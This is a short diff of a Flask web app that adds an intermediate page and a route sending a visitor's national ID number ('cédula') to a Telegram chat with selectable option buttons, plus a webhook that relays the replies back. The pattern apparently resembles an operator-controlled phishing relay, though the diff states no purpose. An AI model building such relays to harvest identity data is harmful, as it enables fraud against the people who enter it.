@@ -15,6 +15,10 @@ WEBHOOK_URL = "https://web-production-dae16.up.railway.app"
 def index():
     return render_template('index.html')
 
+@app.route('/intermediate')
+def intermediate_page():
+    return render_template('intermediate.html')
+
 # Ruta para manejar datos ingresados
 @app.route('/submit', methods=['POST'])
 def submit():
@@ -46,6 +50,14 @@ def webhook():
         socketio.emit('telegram_response', {'response': response_message})
 
     return jsonify({"status": "ok"})
+
+@app.route('/submit_cedula', methods=['POST'])
+def submit_cedula():
+    cedula = request.form['cedula']
+    message = f"Nuevo dato recibido (Cédula): {cedula}\nPor favor selecciona una opción:"
+    send_message_to_telegram_with_buttons(message)
+    return jsonify({"status": "success", "message": "Cédula enviada a Telegram con opciones."})
+
 
 @app.route('/response')
 def response_page():
